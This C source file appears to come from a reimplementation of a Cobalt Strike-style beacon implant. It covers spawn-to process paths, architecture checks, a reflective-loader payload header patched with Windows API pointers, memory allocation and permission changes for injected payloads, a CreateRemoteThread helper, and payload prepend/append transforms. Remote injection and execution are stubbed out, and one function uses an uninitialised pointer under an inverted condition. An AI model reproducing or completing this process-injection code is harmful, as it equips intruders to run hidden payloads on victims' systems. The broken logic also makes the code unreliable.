#include "pch.h"

#include "beacon.h"
#include "settings.h"

DWORD ExpandEnvironmentStrings_s(const char* lpSrc, char* lpDst, size_t size) {
	// determine the size of the buffer required to store the expanded string
	DWORD nSize = ExpandEnvironmentStringsA(lpSrc, NULL, 0);

	// if the size of the buffer is too small, return 0
	if (nSize == 0 || size <= nSize + 1) {
		return 0;
	}

	// expand the string
	return ExpandEnvironmentStringsA(lpSrc, lpDst, size);
}

char* gSpawnToX86 = NULL;
char* gSpawnToX64 = NULL;
DWORD SpawnToExpand(char* expanded, size_t size, BOOL x86)
{
	char lBuffer[256] = { 0 };

	char* spawnTo;
	if (x86)
	{
		if (gSpawnToX86 == NULL || strlen(gSpawnToX86) == 0)
		{
			spawnTo = S_SPAWNTO_X86;
		}
		else
		{
			LERROR("gSpawnToX86 is not NULL or empty");
		}
	}
	else
	{
		if (gSpawnToX64 == NULL || strlen(gSpawnToX64) == 0)
		{
			spawnTo = S_SPAWNTO_X64;
		}
		else
		{
			LERROR("gSpawnToX64 is not NULL or empty");
		}
	}

	snprintf(lBuffer, sizeof(lBuffer), "%s", spawnTo);
	return ExpandEnvironmentStrings_s(lBuffer, expanded, size);
}

#define MAX_CMD 256
void SpawnToFix(BOOL x86, char* cmd)
{
	memset(cmd, 0, MAX_CMD);
	SpawnToExpand(cmd, MAX_CMD, x86);

	if (!x86)
	{
		// look for the substring "sysnative" in cmd
		char* substr = strstr(cmd, "sysnative");
		if (!substr)
			return;

		char aux[MAX_CMD] = { 0 };
		memcpy(substr, "system32", STRLEN("system32"));

		// copy the rest of the string
		char* after = substr + STRLEN("sysnative");
		int afterLength = strlen(after);
		memcpy(aux, after, afterLength);

		memcpy(substr + STRLEN("system32"), aux, strlen(aux) + 1);
	}
}

/**
 * @brief Gets the spawn path based on the architecture.
 *
 * This function retrieves the spawn path depending on the architecture (x86 or x64).
 * The result is stored in the provided buffer after expanding any environment variables.
 *
 * @param x86 Flag indicating whether the architecture is x86 (TRUE) or x64 (FALSE).
 * @param buffer A pointer to the buffer where the spawn path will be stored.
 * @param length The size of the buffer in bytes.
 */
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
{
	char cmd[MAX_CMD];
	SpawnToFix(x86, cmd);

	int size = min(length, MAX_CMD);
	memcpy(buffer, cmd, size);
}

typedef struct _INJECTION
{
	DWORD pid;
	HANDLE process;
	BOOL isX64;
	BOOL isEmulating;
	BOOL isX86NativeOrEmulated;
	BOOL isSamePid;
	BOOL isTemporary;
	HANDLE thread;
} INJECTION;

;
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_ISWOW64PROCESS)(_In_ HANDLE hProcess, _Out_ PBOOL Wow64Process);
typedef WINBASEAPI HMODULE(WINAPI* FN_KERNEL32_LOADLIBRARYA)(_In_ LPCSTR lpLibFileName);
typedef WINBASEAPI FARPROC(WINAPI* FN_KERNEL32_GETPROCADDRESS)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
typedef WINBASEAPI LPVOID(WINAPI* FN_KERNEL32_VIRTUALALLOC)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);

BOOL IsWow64ProcessEx(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandleA("kernel32");
	FN_KERNEL32_ISWOW64PROCESS _IsWow64Process = (FN_KERNEL32_ISWOW64PROCESS)GetProcAddress(hModule, "IsWow64Process");
	if (_IsWow64Process == NULL)
	{
		LERROR("kernel32$IsWow64Process: IsWow64Process is NULL");
		return FALSE;
	}

	BOOL Wow64Process = FALSE;
	return _IsWow64Process(hProcess, &Wow64Process) && Wow64Process;
}

BOOL IsEmulating(HANDLE hProcess)
{
	if (!IS_X64() && !IsWow64ProcessEx(GetCurrentProcess()))
		return FALSE;

	return !IsWow64ProcessEx(hProcess);
}


typedef struct _PAYLOAD
{
	SHORT mzSignature;
	char _[982];
	FN_KERNEL32_LOADLIBRARYA pLoadLibraryA;
	FN_KERNEL32_GETPROCADDRESS pGetProcAddress;
	FN_KERNEL32_VIRTUALALLOC pVirtualAlloc;
	FN_KERNEL32_VIRTUALPROTECT pVirtualProtect;
	DWORD keyPtrMagic;
	DWORD smartInjectMagic;
} PAYLOAD;




char* InjectRemotely(INJECTION* injection, const char* payload, int size)
{
	/*if (S_PROCINJ_ALLOCATOR && injection->isX86NativeOrEmulated)
	{
		return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size);
	}
	else
	{
		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
	}*/
	return NULL;
}

BOOL AdjustMemoryPermissions(char* payload, int size) {
	if(S_PROCINJ_PERMS_I == S_PROCINJ_PERMS)
		return TRUE;

	DWORD flOldProtect;
	if (!VirtualProtect(payload, size, S_PROCINJ_PERMS, &flOldProtect))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
		return FALSE;
	}

	return TRUE;
}

char* InjectLocally(char* payload, int size)
{
	int dwSize = S_PROCINJ_MINALLOC;
	if (size > dwSize)
		dwSize = size + 1024;

	char* pAlloc = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);

	if (!pAlloc)
	{
		DWORD lastError = GetLastError();
		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
		return NULL;
	}

	memcpy(pAlloc, payload, size);
	if (AdjustMemoryPermissions(pAlloc,dwSize))
	{
		return pAlloc;
	}

	VirtualFree(pAlloc, 0, MEM_RELEASE);

	return NULL;
}

BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
{
	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
}

void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
{
	char* target;
	if(injection->isSamePid)
		target = InjectLocally(payload, size);
	else
		target = InjectRemotely(injection, payload, size);

	if (!target)
		return;

	LTODO("Implement ExecuteInjection");
	return;
}

#define REFLECTIVE_LOADER_SIZE 51200
void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProcess, int pid, char* payload, int pLen,
                                 int pOffset, char* str, int aLen)
{
	INJECTION injection;
	injection.pid = pid;
	injection.process = hProcess;
	injection.isX64 = IS_X64();
	injection.isEmulating = IsEmulating(hProcess);
	injection.isX86NativeOrEmulated = injection.isEmulating == IS_X64();
	injection.isSamePid = pid == GetCurrentProcessId();
	injection.isTemporary = processInfo != NULL;
	injection.thread = injection.isTemporary ? processInfo->hThread : NULL;

	PAYLOAD* maskedPayload = (PAYLOAD*)payload;
	if (pLen >= REFLECTIVE_LOADER_SIZE && maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE && maskedPayload->smartInjectMagic == 0xF4F4F4F4)
	{
		if (injection.isX86NativeOrEmulated)
		{
			maskedPayload->pGetProcAddress = GetProcAddress;
			maskedPayload->pLoadLibraryA = LoadLibraryA;
			maskedPayload->pVirtualAlloc = VirtualAlloc;
			maskedPayload->pVirtualProtect = VirtualProtect;

			maskedPayload->keyPtrMagic = 0xF00D;
		}
	}

	datap parser;
	BeaconDataParse(&parser, IS_X64() ? S_PROCINJ_TRANSFORM_X64 : S_PROCINJ_TRANSFORM_X86, 256);

	int prependSize = BeaconDataInt(&parser);
	char* prepend = BeaconDataPtr(&parser, prependSize);

	int appendSize = BeaconDataInt(&parser);
	char* append = BeaconDataPtr(&parser, appendSize);

	char* parameter;
	if (aLen <= 0)
		parameter = 0;
	else
		parameter = InjectRemotely(&injection, str, aLen);

	if (prependSize || appendSize)
	{
		formatp format;
		BeaconFormatAlloc(&format, prependSize + appendSize + pLen + 16);
		BeaconFormatAppend(&format, prepend, prependSize);
		BeaconFormatAppend(&format, payload, pLen);
		BeaconFormatAppend(&format, append, appendSize);

		pOffset += prependSize;

		pLen = BeaconFormatLength(&format);
		payload = BeaconFormatOriginal(&format);

		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
		BeaconFormatFree(&format);
	}
	else
	{
		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
	}
}


void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
{
	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}
